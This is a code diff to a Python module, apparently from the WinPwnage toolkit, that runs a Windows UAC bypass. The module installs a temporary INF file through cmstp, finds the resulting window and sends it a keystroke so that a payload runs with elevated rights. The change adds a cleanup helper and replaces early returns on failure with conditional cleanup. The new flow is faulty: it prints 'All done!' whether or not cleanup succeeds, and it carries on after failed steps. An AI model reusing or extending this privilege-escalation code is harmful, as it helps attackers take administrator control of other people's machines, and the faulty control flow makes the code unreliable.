@@ -19,6 +19,15 @@ cmstp_info = {
 }
 
 
+def cmstp_cleanup():
+	try:
+		os.remove(os.path.join(tempfile.gettempdir(), "tmp.ini"))
+	except Exception as error:
+		print_error("Unable to clean up, manual cleaning is needed")
+		return False
+	else:
+		print_success("Successfully cleaned up, enjoy!")	
+
 def cmstp(payload):
 	if payloads().exe(payload):
 		inf_template = '''[version]
@@ -66,7 +75,8 @@ ShortSvcName="WinPwnageVPN"
 			print_success("Successfully triggered installation of ini file using cmstp binary")
 		else:
 			print_error("Unable to trigger installation of ini file using cmstp binary")
-			return False
+			if "error" in Constant.output:
+				cmstp_cleanup()
 
 		time.sleep(1)
 
@@ -75,7 +85,8 @@ ShortSvcName="WinPwnageVPN"
 			print_success("Successfully detected process window - hwnd ({hwnd})".format(hwnd=hwnd))
 		else:
 			print_error("Unable to detect process window, cannot proceed")
-			return False
+			if "error" in Constant.output:
+				cmstp_cleanup()
 
 		time.sleep(1)	
 
@@ -83,7 +94,8 @@ ShortSvcName="WinPwnageVPN"
 			print_success("Activated window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))			
 		else:
 			print_error("Unable to activate window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))
-			return False			
+			if "error" in Constant.output:
+				cmstp_cleanup()			
 
 		time.sleep(1)	
 
@@ -91,17 +103,13 @@ ShortSvcName="WinPwnageVPN"
 			print_success("Successfully sent keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))	
 		else:
 			print_error("Unable to send keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
-			return False
+			if "error" in Constant.output:
+				cmstp_cleanup()
 
-		time.sleep(1)
+		time.sleep(3)
 
-		try:
-			os.remove(os.path.join(tempfile.gettempdir(), "tmp.ini"))
-		except Exception as error:
-			print_error("Unable to clean up, manual cleaning is needed")
-			return False
-		else:
-			print_success("Successfully cleaned up, enjoy!")
+		if not cmstp_cleanup():
+			print_success("All done!")
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False			
